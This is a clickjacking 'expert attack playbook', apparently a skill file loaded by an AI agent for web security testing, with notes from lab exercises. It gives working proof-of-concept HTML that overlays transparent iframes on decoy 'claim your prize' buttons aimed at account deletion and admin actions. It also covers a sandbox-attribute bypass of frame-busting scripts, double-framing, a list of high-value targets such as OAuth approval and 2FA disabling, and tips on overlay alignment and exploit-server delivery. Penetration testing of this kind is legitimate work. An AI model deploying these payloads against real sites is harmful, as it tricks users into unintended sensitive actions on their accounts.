---
name: clickjacking
description: >-
  Clickjacking playbook. Use when testing whether target pages can be framed, whether X-Frame-Options or CSP frame-ancestors are properly configured, and whether UI redress attacks can trigger sensitive actions.
---

# SKILL: Clickjacking — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Clickjacking (UI redress) techniques. Covers iframe transparency tricks, X-Frame-Options bypass, CSP frame-ancestors, multi-step clickjacking, drag-and-drop attacks, and chaining with other vulnerabilities. Often a "low severity" finding that becomes critical when targeting admin actions.

## 1. CORE CONCEPT

Clickjacking loads a target page in a transparent iframe overlaid on an attacker's page. The victim sees the attacker's UI but clicks on the invisible target page, performing unintended actions.

```html
<style>
  iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.0001; z-index: 2; }
  .decoy { position: absolute; top: 200px; left: 100px; z-index: 1; }
</style>
<div class="decoy"><button>Click to win a prize!</button></div>
<iframe src="https://target.com/account/delete?confirm=yes"></iframe>
```

---

## 2. DETECTION — IS THE PAGE FRAMEABLE?

### Check X-Frame-Options Header

```
X-Frame-Options: DENY           → cannot be framed (secure)
X-Frame-Options: SAMEORIGIN     → only same-origin framing (secure for cross-origin)
X-Frame-Options: ALLOW-FROM uri → deprecated, browser support inconsistent
(header absent)                  → frameable! (vulnerable)
```

### Check CSP frame-ancestors

```
Content-Security-Policy: frame-ancestors 'none'        → cannot be framed
Content-Security-Policy: frame-ancestors 'self'         → same-origin only
Content-Security-Policy: frame-ancestors https://a.com  → specific origin
(directive absent)                                       → frameable
```

**CSP frame-ancestors supersedes X-Frame-Options** in modern browsers.

### Quick PoC Test

```html
<iframe src="https://target.com/sensitive-action" width="800" height="600"></iframe>
```

If the page loads in the iframe → frameable → potentially vulnerable.

### JavaScript Frame Detection (from target page source)

```javascript
// Common frame-busting code found in target pages:
if (top.location.hostname !== self.location.hostname) {
    top.location.href = self.location.href;
}
```

If this code is present but not using CSP `frame-ancestors`, it can often be bypassed.

---

## 3. PROOF OF CONCEPT TEMPLATES

### Basic Single-Click

```html
<html>
<head><title>Free Prize</title></head>
<body>
<h1>Click the button to claim your prize!</h1>
<style>
  iframe { position: absolute; top: 300px; left: 60px;
           width: 500px; height: 200px; opacity: 0.0001; z-index: 2; }
</style>
<iframe src="https://target.com/account/settings?action=delete"></iframe>
</body>
</html>
```

### Multi-Step Clickjacking

For actions requiring multiple clicks (e.g., "Are you sure?" confirmation):

```html
<div id="step1">
  <button onclick="document.getElementById('step1').style.display='none';
                    document.getElementById('step2').style.display='block';">
    Step 1: Click here
  </button>
</div>
<div id="step2" style="display:none">
  <button>Step 2: Confirm</button>
</div>
<iframe src="https://target.com/admin/action"></iframe>
```

Reposition iframe for each step to align the transparent button with the decoy.

### Drag-and-Drop Clickjacking

Extract data from one iframe to another using HTML5 drag-and-drop events — the victim drags across invisible iframes, transferring tokens or data.

---

## 4. BYPASS TECHNIQUES

### Frame-Busting Script Bypass

Some pages use JavaScript frame-busting:
```javascript
if (top !== self) { top.location = self.location; }
```

**Bypass with sandbox attribute**:
```html
<iframe src="https://target.com" sandbox="allow-forms allow-scripts"></iframe>
<!-- sandbox without allow-top-navigation prevents frame-busting -->
```

### X-Frame-Options ALLOW-FROM Bypass

`ALLOW-FROM` is not supported in Chrome/Safari. If the server relies solely on `ALLOW-FROM`, modern browsers ignore it → page is frameable.

### Double-Framing

If `X-Frame-Options: SAMEORIGIN` is set, but a same-origin page exists that can be framed (without XFO), use that page as an intermediary to frame the target.

---

## 5. HIGH-IMPACT TARGETS

```text
Account deletion page
Email/password change form
Admin panel actions (add user, change role)
Payment confirmation
OAuth authorization ("Allow" button)
Two-factor authentication disable
API key generation
Webhook configuration
```

---

## 6. TESTING CHECKLIST

```
□ Check X-Frame-Options header on sensitive pages
□ Check CSP frame-ancestors directive
□ Create iframe PoC and verify page loads
□ Test frame-busting scripts — try sandbox attribute bypass
□ Identify high-value single-click actions
□ For multi-step actions, build multi-click PoC
□ Test both authenticated and unauthenticated pages
□ Verify ALLOW-FROM behavior across browsers
```

## GENERIC_NOTE_CLICKJACKING_PREFILLED_FORM_20260807

- For clickjacking targets that prefill form input from a URL parameter, measure the visible submit button from the live authenticated page instead of assuming a template offset.
- Build the overlay so the transparent iframe covers the real action and the decoy sits on the measured button center; a tiny misalignment is enough to miss the click.
- Treat transport/login/session issues as separate from geometry; if direct page navigation errors, verify completion through the lab status surface before changing the exploit.
- Keep long-term notes generic: store the geometry-measurement method, overlay alignment rule, and completion gate, but omit hostnames, credentials, and final exploit literals.

## GENERIC_NOTE_CLICKJACKING_FRAME_BUSTER_SESSION_GATE_20260805

- For frame-buster clickjacking, separate three branches: local self-test, exploit-server victim delivery path, and victim authenticated state.
- If a sandboxed iframe such as `allow-forms` neutralizes the frame-buster and changes the authenticated tester account locally, record that as a confirmed bypass of the DOM defense, not as completion.
- If exploit-server delivery repeatedly returns the victim flow to `/` while the server blocks executable content or redirects at `/`, classify the remaining issue as a delivery or session gate before spending more time on pixel alignment.
- Keep long-term notes generic; store the frame-buster neutralization condition, the victim-path mismatch, and the timeout gate, but omit hosts, credentials, and final payload literals.

